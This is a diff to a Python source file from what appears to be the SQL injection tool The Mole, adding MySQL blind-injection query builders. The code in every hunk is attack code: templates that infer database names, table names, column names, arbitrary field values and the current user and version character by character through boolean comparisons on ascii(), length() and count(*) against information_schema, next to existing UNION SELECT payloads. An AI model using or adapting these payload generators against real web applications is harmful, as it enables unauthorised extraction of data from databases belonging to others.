@@ -65,11 +65,10 @@ class DbmsMole():
         return False
 
 class Mysql5Mole(DbmsMole):
-
-    out_delimiter = "0x3a3a2d3a3a"
     out_delimiter_result = "::-::"
-    inner_delimiter = "0x3a3a"
-    inner_delimiter_result = "::"
+    out_delimiter = DbmsMole.to_hex(out_delimiter_result)
+    inner_delimiter_result = "><"
+    inner_delimiter = DbmsMole.to_hex(inner_delimiter_result)
     field_finger_str = 'The_Mole.mysqlfinger!'
 
     @classmethod
@@ -89,6 +88,10 @@ class Mysql5Mole(DbmsMole):
         return Mysql5Mole.field_finger_str
     
     @classmethod
+    def blind_field_delimiter(cls):
+        return Mysql5Mole.inner_delimiter_result
+    
+    @classmethod
     def field_finger_query(cls, columns, injectable_field):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
@@ -103,8 +106,23 @@ class Mysql5Mole(DbmsMole):
         query_list[injectable_field] = "CONCAT({fing},@@version,{fing})".format(fing=Mysql5Mole.out_delimiter)
         query += ",".join(query_list) + " {com}"
         return query
+
+    @classmethod
+    def dbms_check_blind_query(cls):
+        return '{sep} and 0 < (select length(@@version)) {end}'
     
-    
+    @classmethod
+    def forge_blind_query(cls, index, value, fields, table, where="1=1", offset=0):
+        return '{sep} and ' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + where + ' limit 1 offset '+str(offset) + '){end}'
+        
+    @classmethod
+    def forge_blind_count_query(cls, operator, value, table, where="1=1"):
+        return '{sep} and ' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+where+'){end}'
+
+    @classmethod
+    def forge_blind_len_query(cls, operator, value, field, table, where="1=1", offset=0):
+        return '{sep} and ' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + where + ' limit 1 offset '+str(offset)+'){end}'
+
     @classmethod
     def forge_query(cls, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
@@ -128,6 +146,24 @@ class Mysql5Mole(DbmsMole):
                "information_schema.schemata", injectable_field, offset=0)
     
     @classmethod
+    def schema_blind_count_query(cls, operator, value):
+        return Mysql5Mole.forge_blind_count_query(
+            operator, value, "information_schema.schemata"
+        )
+
+    @classmethod
+    def schema_blind_len_query(cls, operator, value, offset, where="1=1"):
+        return Mysql5Mole.forge_blind_len_query(
+            operator, value, "schema_name", "information_schema.schemata", offset=offset, where=where
+        )
+
+    @classmethod
+    def schema_blind_data_query(cls, index, value, offset, where="1=1"):
+        return Mysql5Mole.forge_blind_query(
+            index, value, "schema_name", "information_schema.schemata", offset=offset, where=where
+        )
+    
+    @classmethod
     def schema_query(cls, columns, injectable_field, offset):
         return Mysql5Mole.forge_query(columns, "schema_name", 
                "information_schema.schemata", injectable_field, offset=offset)
@@ -143,8 +179,29 @@ class Mysql5Mole(DbmsMole):
     def table_query(cls, db, columns, injectable_field, offset):
         return Mysql5Mole.forge_query(columns, "table_name", 
                     "information_schema.tables", injectable_field,
-                    "table_schema = " + DbmsMole.to_hex(db), offset
+                    "table_schema = " + DbmsMole.to_hex(db), offset=offset
                )
+
+    @classmethod
+    def table_blind_count_query(cls, operator, value, db):
+        return Mysql5Mole.forge_blind_count_query(
+            operator, value, "information_schema.tables", 
+            where="table_schema = " + DbmsMole.to_hex(db)
+        )
+
+    @classmethod
+    def table_blind_len_query(cls, operator, value, db, offset):
+        return Mysql5Mole.forge_blind_len_query(
+            operator, value, "table_name", 
+            "information_schema.tables", offset=offset, where="table_schema = " + DbmsMole.to_hex(db)
+        )
+
+    @classmethod
+    def table_blind_data_query(cls, index, value, db, offset):
+        return Mysql5Mole.forge_blind_query(
+            index, value, "table_name", "information_schema.tables", 
+            offset=offset, where="table_schema = " + DbmsMole.to_hex(db)
+        )
 
     @classmethod
     def columns_count_query(cls, db, table, columns, injectable_field):
@@ -162,6 +219,31 @@ class Mysql5Mole(DbmsMole):
                     " and table_name = " + DbmsMole.to_hex(table), 
                     offset
                )
+               
+    @classmethod
+    def columns_blind_count_query(cls, operator, value, db, table):
+        return Mysql5Mole.forge_blind_count_query(
+            operator, value, "information_schema.columns", 
+            where="table_schema = " + DbmsMole.to_hex(db) + 
+            " and table_name = " + DbmsMole.to_hex(table)
+        )
+
+    @classmethod
+    def columns_blind_len_query(cls, operator, value, db, table, offset):
+        return Mysql5Mole.forge_blind_len_query(
+            operator, value, "column_name", 
+            "information_schema.columns", offset=offset, 
+            where="table_schema = " + DbmsMole.to_hex(db) + 
+            " and table_name = " + DbmsMole.to_hex(table)
+        )
+
+    @classmethod
+    def columns_blind_data_query(cls, index, value, db, table, offset):
+        return Mysql5Mole.forge_blind_query(
+            index, value, "column_name", "information_schema.columns", 
+            offset=offset, where="table_schema = " + DbmsMole.to_hex(db) + 
+            " and table_name = " + DbmsMole.to_hex(table)
+        )
 
     @classmethod
     def fields_count_query(cls, db, table, columns, injectable_field, where="1=1"):
@@ -177,11 +259,44 @@ class Mysql5Mole(DbmsMole):
                     where=where, 
                     offset=offset
                )
+               
+    @classmethod
+    def fields_blind_count_query(cls, operator, value, table, where="1=1"):
+        return Mysql5Mole.forge_blind_count_query(
+            operator, value, table, 
+            where=where
+        )
+
+    @classmethod
+    def fields_blind_len_query(cls, operator, value, fields, table, offset, where="1=1"):
+        return Mysql5Mole.forge_blind_len_query(
+            operator, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',' + ','.join(fields) + ')', 
+            table, offset=offset, where=where
+        )
+
+    @classmethod
+    def fields_blind_data_query(cls, index, value, fields, table, offset, where="1=1"):
+        return Mysql5Mole.forge_blind_query(
+            index, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',' + ','.join(fields) + ')', 
+            table, offset=offset, where=where
+        )
 
     @classmethod
     def dbinfo_query(cls, columns, injectable_field):
         return Mysql5Mole.forge_query(columns, "user(),version()", 
                "information_schema.schemata", injectable_field, offset=0)
+
+    @classmethod
+    def dbinfo_blind_len_query(cls, operator, value):
+        return Mysql5Mole.forge_blind_len_query(
+            operator, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version())', "information_schema.schemata"
+        )
+
+    @classmethod
+    def dbinfo_blind_data_query(cls, index, value):
+        return Mysql5Mole.forge_blind_query(
+            index, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version())', "information_schema.schemata"
+        )
 
     @classmethod
     def parse_results(cls, url_data):
